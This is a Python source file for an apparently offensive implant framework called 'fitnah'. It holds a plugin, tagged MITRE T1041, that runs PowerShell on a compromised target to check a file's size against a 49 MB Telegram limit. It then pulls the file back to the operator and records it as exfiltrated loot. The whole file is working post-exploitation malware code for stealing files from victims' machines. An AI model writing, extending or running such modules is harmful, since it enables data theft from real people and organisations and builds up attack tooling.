"""exfiltration/upload_file — download file from implant to operator. MITRE T1041"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class UploadFile(BasePlugin):
    NAME        = "upload_file"
    DESCRIPTION = "Download a file from the target via ctx.download(); verify existence and size first."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1041"
    CATEGORY    = "exfiltration"
    schema      = ParamSchema().add(
        Param("path",     str,  required=True,  help="Full path to file on target"),
        Param("max_mb",   int,  required=False, default=49,
              help="Refuse if file exceeds this size in MB (default 49 = Telegram limit)"),
    )

    @mitre("T1041")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        path   = params["path"]
        max_mb = params.get("max_mb", 49)

        # Verify file exists and check size before attempting download
        check = ctx.ps(
            f"$f = Get-Item '{path}' -EA SilentlyContinue;"
            "if (-not $f) { 'NOT_FOUND' }"
            f"elseif ($f.Length -gt {max_mb * 1024 * 1024}) {{ 'TOO_LARGE:' + $f.Length }}"
            "else { 'OK:' + $f.Length }"
        )
        if check["status"] != "ok":
            return ModuleResult.err(check["output"])

        info = check["output"].strip()
        if info == "NOT_FOUND":
            return ModuleResult.err(f"File not found: {path}")
        if info.startswith("TOO_LARGE:"):
            size_mb = int(info.split(":")[1]) // (1024 * 1024)
            return ModuleResult.err(
                f"File too large ({size_mb} MB > {max_mb} MB limit). Use chunked_send or zip_exfil."
            )

        size_bytes = int(info.split(":")[1]) if ":" in info else 0
        r = ctx.download(path)
        if r["status"] != "ok":
            return ModuleResult.err(r.get("output", "Download failed"))

        size_kb = round(size_bytes / 1024, 1)
        return ModuleResult.ok(
            data=f"[+] File exfiltrated: {path}  ({size_kb} KB)",
            loot_kind="file"
        )
